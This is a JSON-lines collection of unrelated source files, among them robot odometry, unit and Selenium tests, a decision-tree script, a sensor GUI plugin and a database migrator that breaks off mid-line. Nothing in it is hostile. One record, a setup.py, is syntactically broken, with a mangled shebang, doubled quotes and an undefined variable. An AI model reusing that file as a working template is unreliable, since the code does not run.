{"text": "[\"LuxR-lux-AHL\",[\"lux-AHL 3OC6HSL\",\"LuxR-lux-AHL\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231)],\"{{k_{Rlux}}}*lux-AHL 3OC6HSL-{{k_{Rlux}}}*LuxR-lux-AHL-{{d}}*LuxR-lux-AHL\"]\r\n#all\r\n[\"LuxR-lux-AHL\",[\"LuxR-lux-AHL\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231)],\"-{{k_{Rlux}}}*LuxR-lux-AHL-{{d}}*LuxR-lux-AHL\"]\r\n#no lux-AHL 3OC6HSL\r\n[\"LuxR-lux-AHL\",[\"lux-AHL 3OC6HSL\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231)],\"{{k_{Rlux}}}*lux-AHL 3OC6HSL\"]\r\n#no LuxR-lux-AHL\r\n\r\n[\"LuxR-lux-AHL\",[\"LuxR\",\"LuxR-lux-AHL\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231)],\"{{k_{Rlux}}}*LuxR-{{k_{Rlux}}}*LuxR-lux-AHL-{{d}}*LuxR-lux-AHL\"]\r\n#all\r\n[\"LuxR-lux-AHL\",[\"LuxR-lux-AHL\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231)],\"-{{k_{Rlux}}}*LuxR-lux-AHL-{{d}}*LuxR-lux-AHL\"]\r\n# no LuxR\r\n[\"LuxR-lux-AHL\",[\"LuxR\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231)],\"{{k_{Rlux}}}*LuxR\"]\r\n#no LuxR-lux-AHL\r\n\r\n[\"Bxb1\",[\"LuxR-lux-AHL\",\"Plux\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231),(\"alpha_{Bxb1}\",0.588),(\"n\",2),(\"Bxb1\",150)],\"{{alpha_{Bxb1}}}*{{Bxb1}}*LuxR-lux-AHL**{{n}}/({{k_{Rlux}}}**{{n}}+LuxR-lux-AHL**{{n}})-{{d}}*Bxb1\"]\r\n#all\r\n[\"Bxb1\",[\"Plux\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231),(\"alpha_{Bxb1}\",0.588),(\"n\",2),(\"Bxb1\",150)],\"-{{d}}*Bxb1\"]\r\n# no LuxR-lux-AHL\r\n[\"Bxb1\",[\"LuxR-lux-AHL\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231),(\"alpha_{Bxb1}\",0.588),(\"n\",2),(\"Bxb1\",150)],\"-{{d}}*Bxb1\"]\r\n# no Plux\r\n[\"Bxb1\",[\"LuxR-lux-AHL\"],[(\"k_{Rlux}\",0.1),(\"d\",0.0231),(\"alpha_{Bxb1}\",0.588),(\"n\",2),(\"Bxb1\",150)],\"-{{d}}*Bxb1\"]\r\n#no LuxR-lux-AHL,Plux"}
{"text": "#!/usr/bin/env python\n#-*- coding=utf-8 -*-\n#author: yezhihua@baidu.com\n\nimport urllib,urllib2,json\nimport queue_monitor\n\ndef input_monitor_plat(item_id, value, content):\n\ttry:\n\t\tdata = {\"item_id\":item_id, \"value\": value, \"content\":content}\n\t\tbody = urllib.urlencode(data)\n\t\tfp = urllib2.urlopen(\"http://cq02-testing-mb13.cq02.baidu.com:8282/movie_monitor/alarm_storage?\"+body)\n\t\tres_str = fp.readlines()\n\t\tjson_str = json.loads(res_str[0])\n\t\tif \"OK\" == json_str[0][\"message\"]:\n\t\t\tprint \"succeed!\"\n\t\telse:\n\t\t\tprint \"failed!\"\n\texcept Exception, e:\n\t\terr_msg = \"Exception in api: %s!\"%e\n\t\tprint err_msg\n\nif __name__ == '__main__':\n    result = queue_monitor.queue_monitor().getPage()\n    print \"result is \"+str(result)\n    result[\"schedulequeue\"]['num'] = 200\n    result[\"adjust\"]['num'] = 200\n    result[\"record\"]['num'] = 200\n    alarm_queue = ''\n    alarm_flag = 0\nfor key in result:\n    value = result[key]\n    if int(value['num']) > int(value['level']):\n        alarm_flag = 1\n        alarm_queue += value['name'] + '(' + str(value['num']) +  '>' + str(value['level']) + ')  '\n\nif alarm_flag == 1:\n    monitor_item_id = 49\n    alarm_value = 1\n    alarm_content = \"MQ_SERVER\u961f\u5217\u957f\u5ea6\u8d85\u8fc7\u9608\u503c! \" + alarm_queue\n    print alarm_content\n    #input_monitor_plat(monitor_item_id, alarm_value, alarm_content)\n"}
{"text": "s!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nwith open('README.md') as readme_file:\n    readme = readme_file.read()\n\nrequirements = [\n    # TODO: put package requirements here\n]\n\ntest_requirements = [\n    # TODO: put package test requirements here\n]\n\nsetup(\n    name='tripp',\n    version='0.1.0',\n    description=\"\"Data science fundamentals\"\",\n    long_description=readme + '\\n\\n' + history,\n    author=\"Michael Ruggiero\",\n    author_email='mjamesruggiero@gmail.com',\n    url='https://github.com/mjamesruggiero/tripp',\n    packages=[\n        'tripp',\n    ],\n    package_dir={'tripp':\n                 'tripp'},\n    include_package_data=True,\n    install_requires=requirements,\n    license=\"BSD\",\n    zip_safe=False,\n    keywords='tripp',\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        \"Programming Language :: Python :: 2\",\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n    ],\n    test_suite='tests',\n    tests_require=test_requirements\n)\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"\nTests for the command decorators\n\"\"\"\n\nimport unittest\nimport unittest.mock\n\nimport asynctest\n\nimport botman.commands.base\nimport botman.errors\n\nimport tests.mixins\n\n@asynctest.fail_on(unused_loop=False)\nclass TestChatCommandDecorator(tests.mixins.DiscordMockMixin, asynctest.TestCase):\n    \"\"\"\n    Tests for the chat_command decorator\n    \"\"\"\n\n    def test_not_callable(self):\n        \"\"\"\n        Tests that we can't decorate a non-callable object\n        \"\"\"\n\n        expected = 'Cannot use a non-callable as a command'\n        with self.assertRaises(botman.errors.ConfigurationError, msg=expected):\n            botman.commands.base.chat_command('test')({})\n\n    def test_not_coroutine(self):\n        \"\"\"\n        Tests that we can't decorate a non-coroutine function\n        \"\"\"\n\n        mock_handler = unittest.mock.Mock(__name__='test')\n\n        expected = 'Cannot use a non-coroutine as a command'\n        with self.assertRaises(botman.errors.ConfigurationError, msg=expected):\n            botman.commands.base.chat_command('test')(mock_handler)\n\n    def test_decorator_returns_command(self):\n        \"\"\"\n        Tests that the decorator returns a Command instance\n        \"\"\"\n\n        mock_handler = asynctest.CoroutineMock(__name__='test')\n        wrapped = botman.commands.base.chat_command('test')(mock_handler)\n\n        self.assertIsInstance(\n            wrapped,\n            botman.commands.base.Command,\n            'The function became a command instance',\n        )\n\n    def test_wrapper_has_name(self):\n        \"\"\"\n        Tests that the decorator adds the correct name\n        \"\"\"\n\n        mock_handler = asynctest.CoroutineMock(__name__='test')\n        wrapped = botman.commands.base.chat_command('test')(mock_handler)\n\n        self.assertEqual(\n            'test',\n            wrapped.name,\n            'The command had the correct name',\n        )\n\n    async def test_wrapper_calls_handler(self):\n        \"\"\"\n        Tests that the Command instance calls the handler\n        \"\"\"\n\n        mock_handler = asynctest.CoroutineMock(__name__='test')\n        wrapped = botman.commands.base.chat_command('test')(mock_handler)\n\n        message = self.get_mock_message('test')\n        wrapped.pattern = 'test'\n\n        mock_bot = self.get_mock_bot()\n\n        await wrapped(mock_bot, message, '')\n\n        mock_handler.assert_called_with(mock_bot, message)\n\nclass TestDescriptionDecorator(unittest.TestCase):\n    \"\"\"\n    Tests for the description deorator\n    \"\"\"\n\n    def test_decorator_non_command(self):\n        \"\"\"\n        Tests that the decorator only works on command instances\n        \"\"\"\n\n        mock_handler = asynctest.CoroutineMock(__name__='test')\n\n        expected = 'test must have the chat_command decorator'\n        with self.assertRaises(botman.errors.ConfigurationError, msg=expected):\n            botman.commands.base.description('Descriptive')(mock_handler)\n\n    def test_sets_description(self):\n        \"\"\"\n        Tests that the decorator actually sets the description\n        \"\"\"\n\n        mock_handler = asynctest.CoroutineMock(__name__='test')\n        wrapped = botman.commands.base.chat_command('test')(mock_handler)\n        wrapped = botman.commands.base.description('Descriptive')(wrapped)\n\n        self.assertEqual(\n            'Descriptive',\n            wrapped.description,\n            'The description was set',\n        )\n\nclass TestParametersDecorator(unittest.TestCase):\n    \"\"\"\n    Tests for the parameters decorator\n    \"\"\"\n\n    def test_decorator_non_command(self):\n        \"\"\"\n        Tests that the decorator only works on command instances\n        \"\"\"\n\n        mock_handler = asynctest.CoroutineMock(__name__='test')\n\n        expected = 'test must have the chat_command decorator'\n        with self.assertRaises(botman.errors.ConfigurationError, msg=expected):\n            botman.commands.base.parameters()(mock_handler)\n\n    def test_sets_parameters(self):\n        \"\"\"\n        Tests that the decorator actually sets the parameters\n        \"\"\"\n\n        params = {\n            'one': botman.commands.base.StringArg(),\n            'two': botman.commands.base.StringArg(),\n        }\n\n        mock_handler = asynctest.CoroutineMock(__name__='test')\n        wrapped = botman.commands.base.chat_command('test')(mock_handler)\n        wrapped = botman.commands.base.parameters(**params)(wrapped)\n\n        self.assertDictEqual(\n            params,\n            wrapped.parameters,\n            'The parameters were set',\n        )\n\n"}
{"text": "# -*- coding: utf-8 -*-\n\"\"\"\nCO2 2.0 Plugin\nCopyright (C) 2019 Olaf L\u00fcke <olaf@tinkerforge.com>\n\nco2_v2.py: CO2 2.0 Plugin Implementation\n\nThis program is free software; you can redistribute it and/or\nmodify it under the terms of the GNU General Public License\nas published by the Free Software Foundation; either version 2\nof the License, or (at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public\nLicense along with this program; if not, write to the\nFree Software Foundation, Inc., 59 Temple Place - Suite 330,\nBoston, MA 02111-1307, USA.\n\"\"\"\n\nfrom PyQt5.QtCore import Qt\nfrom PyQt5.QtWidgets import QVBoxLayout, QHBoxLayout\n\nfrom brickv.plugin_system.comcu_plugin_base import COMCUPluginBase\nfrom brickv.bindings.bricklet_co2_v2 import BrickletCO2V2\nfrom brickv.plot_widget import PlotWidget, CurveValueWrapper\nfrom brickv.callback_emulator import CallbackEmulator\n\nclass CO2V2(COMCUPluginBase):\n    def __init__(self, *args):\n        super().__init__(BrickletCO2V2, *args)\n\n        self.co2 = self.device\n\n        self.cbe_all_values = CallbackEmulator(self,\n                                               self.co2.get_all_values,\n                                               None,\n                                               self.cb_all_values,\n                                               self.increase_error_count)\n\n        self.current_co2 = CurveValueWrapper() # int, ppm\n        self.current_temperature = CurveValueWrapper() # float, \u00b0C\n        self.current_humidity = CurveValueWrapper() # float, %RH\n\n        plots_co2 = [('CO2', Qt.red, self.current_co2, '{} PPM'.format)]\n        self.plot_widget_co2 = PlotWidget('CO2 [PPM]', plots_co2, y_resolution=1.0)\n\n        plots_temperature = [('Temperature', Qt.red, self.current_temperature, '{} \u00b0C'.format)]\n        self.plot_widget_temperature = PlotWidget('Temperature [\u00b0C]', plots_temperature, y_resolution=0.01)\n\n        plots_humidity = [('Relative Humidity', Qt.red, self.current_humidity, '{} %RH'.format)]\n        self.plot_widget_humidity = PlotWidget('Relative Humidity [%RH]', plots_humidity, y_resolution=0.01)\n\n        layout_plot1 = QHBoxLayout()\n        layout_plot1.addWidget(self.plot_widget_co2)\n\n        layout_plot2 = QHBoxLayout()\n        layout_plot2.addWidget(self.plot_widget_temperature)\n        layout_plot2.addWidget(self.plot_widget_humidity)\n\n        layout_main = QVBoxLayout(self)\n        layout_main.addLayout(layout_plot1)\n        layout_main.addLayout(layout_plot2)\n\n    def cb_all_values(self, values):\n        self.current_co2.value = values.co2_concentration\n        self.current_temperature.value = values.temperature / 100.0\n        self.current_humidity.value = values.humidity / 100.0\n\n    def start(self):\n        self.cbe_all_values.set_period(250)\n\n        self.plot_widget_co2.stop = False\n        self.plot_widget_temperature.stop = False\n        self.plot_widget_humidity.stop = False\n\n    def stop(self):\n        self.cbe_all_values.set_period(0)\n\n        self.plot_widget_co2.stop = True\n        self.plot_widget_temperature.stop = True\n        self.plot_widget_humidity.stop = True\n\n    def destroy(self):\n        pass\n\n    @staticmethod\n    def has_device_identifier(device_identifier):\n        return device_identifier == BrickletCO2V2.DEVICE_IDENTIFIER\n"}
{"text": "\"\"\"Test SCB/PXWeb scraper.\"\"\"\nfrom statscraper.scrapers import SCB\nfrom statscraper.exceptions import InvalidData\nimport pytest\n\n\ndef test_get_data():\n    \"\"\"We should be able to access a dataset by path.\"\"\"\n    scraper = SCB()\n    scraper.move_to(\"HE\").move_to(\"HE0110\").move_to(\"HE0110F\").move_to(\"Tab1DispInkN\")\n    data = scraper.fetch({\n      \"ContentsCode\": (\"item\", \"000002VY\"),\n      \"InkomstTyp\": (\"item\", \"FastInkIn\"),\n    }, by=\"municipality\")\n\n    assert \"Region\" in data.dataset.dimensions\n    assert \"InkomstTyp\" in data.dataset.dimensions\n\n    df = data.pandas\n    assert \"value\" in df.columns\n    assert \"Region\" in df.columns\n    assert \"InkomstTyp\" in df.columns\n\n\ndef test_values():\n    \"\"\"Make sure values are numerical.\"\"\"\n    scraper = SCB()\n    scraper.move_to(\"HE\").move_to(\"HE0110\").move_to(\"HE0110F\").move_to(\"Tab1DispInkN\")\n    data = scraper.fetch({\n      \"ContentsCode\": (\"item\", \"000002VY\"),\n      \"InkomstTyp\": (\"item\", \"FastInkIn\"),\n    }, by=\"municipality\")\n    float(data[0].value.isnumeric())\n\n\ndef test_invalid_query():\n    \"\"\"We should raise an error on invalid queries.\"\"\"\n    scraper = SCB()\n    scraper.move_to(\"HE\").move_to(\"HE0110\").move_to(\"HE0110F\").move_to(\"Tab1DispInkN\")\n    with pytest.raises(InvalidData):\n        scraper.fetch({\n          \"foo\": (\"bar\", \"buzz\"),\n        }, by=\"municipality\")\n"}
{"text": "from __future__ import division\nfrom math import pi, sin, cos\nfrom diff_drive.encoder import Encoder\nfrom diff_drive.pose import Pose\n\nclass Odometry:\n    \"\"\"Keeps track of the current position and velocity of a\n    robot using differential drive.\n    \"\"\"\n\n    def __init__(self):\n        self.leftEncoder = Encoder()\n        self.rightEncoder = Encoder()\n        self.pose = Pose()\n        self.lastTime = 0\n\n    def setWheelSeparation(self, separation):\n        self.wheelSeparation = separation\n\n    def setTicksPerMeter(self, ticks):\n        self.ticksPerMeter = ticks\n        \n    def setEncoderRange(self, low, high):\n        self.leftEncoder.setRange(low, high)\n        self.rightEncoder.setRange(low, high)\n\n    def setTime(self, newTime):\n        self.lastTime = newTime\n        \n    def updateLeftWheel(self, newCount):\n        self.leftEncoder.update(newCount)\n\n    def updateRightWheel(self, newCount):\n        self.rightEncoder.update(newCount)\n\n    def updatePose(self, newTime):\n        \"\"\"Updates the pose based on the accumulated encoder ticks\n        of the two wheels. See https://chess.eecs.berkeley.edu/eecs149/documentation/differentialDrive.pdf\n        for details.\n        \"\"\"\n        leftTravel = self.leftEncoder.getDelta() / self.ticksPerMeter\n        rightTravel = self.rightEncoder.getDelta() / self.ticksPerMeter\n        deltaTime = newTime - self.lastTime\n\n        deltaTravel = (rightTravel + leftTravel) / 2\n        deltaTheta = (rightTravel - leftTravel) / self.wheelSeparation\n\n        if rightTravel == leftTravel:\n            deltaX = leftTravel*cos(self.pose.theta)\n            deltaY = leftTravel*sin(self.pose.theta)\n        else:\n            radius = deltaTravel / deltaTheta\n\n            # Find the instantaneous center of curvature (ICC).\n            iccX = self.pose.x - radius*sin(self.pose.theta)\n            iccY = self.pose.y + radius*cos(self.pose.theta)\n\n            deltaX = cos(deltaTheta)*(self.pose.x - iccX) \\\n                - sin(deltaTheta)*(self.pose.y - iccY) \\\n                + iccX - self.pose.x\n\n            deltaY = sin(deltaTheta)*(self.pose.x - iccX) \\\n                + cos(deltaTheta)*(self.pose.y - iccY) \\\n                + iccY - self.pose.y\n\n        self.pose.x += deltaX\n        self.pose.y += deltaY\n        self.pose.theta = (self.pose.theta + deltaTheta) % (2*pi)\n        self.pose.xVel = deltaTravel / deltaTime if deltaTime > 0 else 0.\n        self.pose.yVel = 0\n        self.pose.thetaVel = deltaTheta / deltaTime if deltaTime > 0 else 0.\n\n        self.lastTime = newTime\n\n    def getPose(self):\n        return self.pose;\n\n    def setPose(self, newPose):\n        self.pose = newPose\n"}
{"text": "# -*- coding: utf-8 -*-\n\"\"\"\nDjango REST framework tests generator which is based on API Blueprint\n(https://apiblueprint.org/) documents.\nReleased under New BSD License.\n\nCopyright \u00a9 2015, Vadim Markovtsev :: AO InvestGroup\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above copyright\n      notice, this list of conditions and the following disclaimer in the\n      documentation and/or other materials provided with the distribution.\n    * Neither the name of the AO InvestGroup nor the\n      names of its contributors may be used to endorse or promote products\n      derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL VADIM MARKOVTSEV BE LIABLE FOR ANY\nDIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\nON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\"\"\"\nimport argparse\nimport os\n\nfrom .generator import TestsGenerator\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-t\", \"--template\", help=\"Jinja2 template to use\",\n                        default=os.path.abspath(os.path.join(\n                            os.path.dirname(__file__), \"tests.jinja2\")))\n    parser.add_argument(\"-b\", \"--base-class\",\n                        help=\"Fully qualified base class for tests\")\n    parser.add_argument(\"-c\", \"--no-comments\", action=\"store_true\",\n                        help=\"Do not add docstrings to classes and methods\")\n    parser.add_argument(\"-o\", \"--output\", help=\"Output Python file with tests\")\n    parser.add_argument(\"--disable-html2text\", action=\"store_true\",\n                        help=\"Do not use html2text to convert descriptions \"\n                             \"(otherwise it makes this program licensed under \"\n                             \"GPLv3!)\")\n    parser.add_argument(\"input\", nargs='+', help=\"Input APIBlueprint files\")\n    args = parser.parse_args()\n    generator = TestsGenerator(\n        args.template, include_comments=not args.no_comments,\n        base_class=args.base_class, html2text=not args.disable_html2text,\n        *args.input)\n    generator.generate(args.output)\n\nif __name__ == \"__main__\":\n    main()\n"}
{"text": "\"\"\"Test that problems and problem submission works well.\"\"\"\nimport time\n\nfrom selenium.common.exceptions import StaleElementReferenceException\n\nfrom workbench import scenarios\nfrom workbench.test.selenium_test import SeleniumTest\nfrom bok_choy.query import BrowserQuery\n\n\nclass ProblemInteractionTest(SeleniumTest):\n    \"\"\"\n    A browser-based test of answering problems right and wrong.\n    \"\"\"\n\n    def setUp(self):\n        super(ProblemInteractionTest, self).setUp()\n\n        one_problem = \"\"\"\n            <problem_demo>\n                <html_demo><p class=\"the_numbers\">$a $b</p></html_demo>\n                <textinput_demo name=\"sum_input\" input_type=\"int\" />\n                <equality_demo name=\"sum_checker\" left=\"./sum_input/@student_input\" right=\"$c\" />\n                <script>\n                    import random\n                    a = random.randint(1, 1000000)\n                    b = random.randint(1, 1000000)\n                    c = a + b\n                </script>\n            </problem_demo>\n            \"\"\"\n        self.num_problems = 3\n        scenarios.add_xml_scenario(\n            \"test_many_problems\", \"Many problems\",\n            \"<vertical_demo>\" + one_problem * self.num_problems + \"</vertical_demo>\"\n        )\n        self.addCleanup(scenarios.remove_scenario, \"test_many_problems\")\n\n    def test_many_problems(self):\n        # Test that problems work properly.\n        self.browser.get(self.live_server_url + \"/scenario/test_many_problems\")\n        header1 = BrowserQuery(self.browser, css=\"h1\")\n        self.assertEqual(header1.text[0], \"XBlock: Many problems\")\n\n        # Find the numbers on the page.\n        nums = self.browser.find_elements_by_css_selector(\"p.the_numbers\")\n        num_pairs = [tuple(int(n) for n in num.text.split()) for num in nums]\n        # They should be all different.\n        self.assertEqual(len(set(num_pairs)), self.num_problems)\n\n        text_ctrls_xpath = '//div[@data-block-type=\"textinput_demo\"][@data-name=\"sum_input\"]/input'\n        text_ctrls = self.browser.find_elements_by_xpath(text_ctrls_xpath)\n        check_btns = BrowserQuery(self.browser, css='input.check')\n        check_indicators = 'span.indicator'\n\n        def assert_image(right_wrong_idx, expected_icon):\n            \"\"\"Assert that the img src text includes `expected_icon`\"\"\"\n            for _ in range(3):\n                try:\n                    sources = BrowserQuery(self.browser, css='{} img'.format(check_indicators)).nth(right_wrong_idx).attrs('src')\n                    if sources and expected_icon in sources[0]:\n                        break\n                    else:\n                        time.sleep(.25)\n                except StaleElementReferenceException as exc:\n                    print exc\n            self.assertIn(expected_icon, sources[0])\n\n        for i in range(self.num_problems):\n            # Before answering, the indicator says Not Attempted.\n            self.assertIn(\"Not attempted\", BrowserQuery(self.browser, css=check_indicators).nth(i).text[0])\n\n            answer = sum(num_pairs[i])\n\n            for _ in range(2):\n                # Answer right.\n                text_ctrls[i].clear()\n                text_ctrls[i].send_keys(str(answer))\n                check_btns[i].click()\n                assert_image(i, \"/correct-icon.png\")\n\n                # Answer wrong.\n                text_ctrls[i].clear()\n                text_ctrls[i].send_keys(str(answer + 1))\n                check_btns[i].click()\n                assert_image(i, \"/incorrect-icon.png\")\n"}
{"text": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Tue Oct 18 10:38:03 2016\n\n@author: Vipul Munot\n\"\"\"\ntennis=[line.strip().split(',') for line in open('tennis.txt')]\ntest_tennis=[line.strip().split(',') for line in open('test-tennis.txt')]\ndata=[['slashdot','USA','yes',18,'None'],\n        ['google','France','yes',23,'Premium'],\n        ['digg','USA','yes',24,'Basic'],\n        ['kiwitobes','France','yes',23,'Basic'],\n        ['google','UK','no',21,'Premium'],\n        ['(direct)','New Zealand','no',12,'None'],\n        ['(direct)','UK','no',21,'Basic'],\n        ['google','USA','no',24,'Premium'],\n        ['slashdot','France','yes',19,'None'],\n        ['digg','USA','no',18,'None'],\n        ['google','UK','no',18,'None'],\n        ['kiwitobes','UK','no',19,'None'],\n        ['digg','New Zealand','yes',12,'Basic'],\n        ['slashdot','UK','no',21,'None'],\n        ['google','UK','yes',18,'Basic'],\n        ['kiwitobes','France','yes',19,'Basic']]\n\nclass node:\n    def __init__(self,col=-1,value=None,results=None,left=None,right=None):\n        self.col=col\n        self.value = value\n        self.results=results # Stores Predicted Output (None: for non leaf nodes)\n        self.left=left # True values\n        self.right=right # False values\n\ndef split_data(data,column,value):\n    split = None\n    if isinstance(value,int) or isinstance(value,float):\n        split = lambda item:item[column]>=value\n    else:\n        split = lambda item:item[column]==value\n    subset1 = [item for item in data if split(item)]\n    subset2 = [item for item in data if not split(item)]\n    return (subset1,subset2)\n\nr1,r2 = split_data(data,2,'yes')\n#print (\"\\nSubset 1: \",r1)    \n#print (\"\\nSubset 2: \",r2)    \n\ndef frequency(data):\n    result ={}\n    for value in data:\n        cols = value[len(value)-1]\n        if cols not in result: result[cols]=0\n        result[cols]+=1\n    return result\n    \ndef entropy(data):\n    result =0.0\n    freq = frequency(data)\n    for val in freq.keys():\n        import math\n        prob = float(freq[val])/len(data)\n        result = result - prob*math.log2(prob)\n    return result\n#print (\"\\nEntropy: \",entropy(data))\n#print (\"\\nEntropy: \",entropy(r1))    \n\ndef build_tree(rows):\n  if len(rows)==0: return node()\n  currentScore=entropy(rows)\n\n  best_gain=0.0\n  best_criteria=None\n  best_sets=None\n  \n  column_count=len(rows[0])-1\n  for col in range(0,column_count):\n\n    column_values={}\n    for row in rows:\n       column_values[row[col]]=1\n    for value in column_values.keys():\n      (set1,set2)=split_data(rows,col,value)\n\n      p=float(len(set1))/len(rows)\n      gain=currentScore-p*entropy(set1)-(1-p)*entropy(set2)\n      if gain>best_gain and len(set1)>0 and len(set2)>0:\n        best_gain=gain\n        best_criteria=(col,value)\n        best_sets=(set1,set2)\n  \n  if best_gain>0:\n    trueBranch=build_tree(best_sets[0])\n    falseBranch=build_tree(best_sets[1])\n    return node(col=best_criteria[0],value=best_criteria[1],\n                        left=trueBranch,right=falseBranch)\n  else:\n    return node(results=frequency(rows))\ntree = build_tree(data) \ntennis_tree = build_tree(tennis) \ndef print_tree(tree,indent = ' '):\n    if tree.results!= None:\n        print (str(tree.results))\n    else:\n        print (str(tree.col)+':'+str(tree.value))\n        print (indent+ 'Left ->',print_tree(tree.left,indent+' '))\n        print (indent+ 'Right ->',print_tree(tree.right,indent+' '))\n\nprint (print_tree(tree))        \nprint (\"\\nTennis:\\n\")\nprint (print_tree(tennis_tree))        \n\ndef classify(observation,tree):\n    if tree.results!=None: return tree.results\n    else:\n        val = observation[tree.col]\n        branch = None\n        if isinstance(val,int)or isinstance(val,float):\n            if val >=tree.value: branch= tree.left\n            else: branch = tree.right\n        else:\n            if val == tree.value: branch=tree.left\n            else: branch = tree.right\n    return classify(observation,branch)\n\nprint (\"\\nClasificaton: \",classify(['(direct)','USA','yes',5],tree))    \nfor values in test_tennis:\n    print (\"\\n\",values,\"\\tClasificaton: \",classify(values,tennis_tree))"}
{"text": "#!/usr/bin/python3\n\n# This file is part of Munin.\n\n# Munin is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n\n# Munin is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License\n# along with Munin; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n\n# This work is Copyright (C)2006 by Andreas Jacobsen\n# Individual portions may be copyright by individual contributors, and\n# are included in this collective work with permission of the copyright\n# owners.\n\nimport sys\nimport psycopg2\nimport psycopg2.extras\n\n\nclass migrator:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def add_padding(self):\n        for i in range(1, 92):\n            prop = self.find_single_prop_by_id(i)\n            if not prop or prop[\"active\"] or prop[\"padding\"]:\n                continue\n\n            (voters, yes, no) = self.get_voters_for_prop(prop[\"id\"])\n            (\n                winners,\n                losers,\n                winning_total,\n                losing_total,\n            ) = self.get_winners_and_losers(voters, yes, no)\n            query = \"UPDATE %s_proposal SET \" % (prop[\"prop_type\"],)\n            query += \" vote_result=%s,compensation=%s\"\n            query += \" WHERE id=%s\"\n            args = ([\"no\", \"yes\"][yes > no], losing_total, prop[\"id\"])\n            print(query % args)\n            self.cursor.execute(query, args)\n            if self.cursor.rowcount < 1:\n                print(\"argh!\")\n\n    def find_single_prop_by_id(self, prop_id):\n        query = \"SELECT id, prop_type, proposer, person, created, padding, comment_text, active, closed FROM (\"\n        query += \"SELECT t1.id AS id, 'invite' AS prop_type, t2.pnick AS proposer, t1.person AS person, t1.padding AS padding, t1.created AS created,\"\n        query += (\n            \" t1.comment_text AS comment_text, t1.active AS active, t1.closed AS closed\"\n        )\n        query += \" FROM invite_proposal AS t1 INNER JOIN user_list AS t2 ON t1.proposer_id=t2.id UNION (\"\n        query += \" SELECT t3.id AS id, 'kick' AS prop_type, t4.pnick AS proposer, t5.pnick AS person, t3.padding AS padding, t3.created AS created,\"\n        query += (\n            \" t3.comment_text AS comment_text, t3.active AS active, t3.closed AS closed\"\n        )\n        query += \" FROM kick_proposal AS t3\"\n        query += \" INNER JOIN user_list AS t4 ON t3.proposer_id=t4.id\"\n        query += (\n            \" INNER JOIN user_list AS t5 ON t3.person_id=t5.id)) AS t6 WHERE t6.id=%s\"\n        )\n\n        self.cursor.execute(query, (prop_id,))\n        return self.cursor.fetchone()\n\n    def get_winners_and_losers(self, voters, yes, no):\n        if yes > no:\n            losers = voters[\"no\"]\n            winners = voters[\"yes\"]\n            winning_total = yes\n            losing_total = no\n        else:\n            winners = voters[\"no\"]\n            losers = voters[\"yes\"]\n            winning_total = no\n            losing_total = yes\n        return (winners, losers, winning_total, losing_total)\n\n    def get_voters_for_prop(self, prop_id):\n        query = \"SELECT t1.vote AS vote,t1.carebears AS carebears\"\n        query += \", t1.prop_id AS prop_idd,t1.voter_id AS voter_id,t2.pnick AS pnick\"\n        query += \" FROM prop_vote AS t1\"\n        query += \" INNER JOIN user_list AS t2 ON t1.voter_id=t2.id\"\n        query += \" WHERE prop_id=%s\"\n        self.cursor.execute(query, (prop_id,))\n        voters = {}\n        voters[\"yes\"] = []\n        voters[\"no\"] = []\n        voters[\"abstain\"] = []\n        yes = 0\n        no = 0\n\n        for r in self.cursor.fetchall():\n            if r[\"vote\"] == \"yes\":\n                yes += r[\"carebears\"]\n                voters[\"yes\"].append(r)\n            elif r[\"vote\"] == \"no\":\n                no += 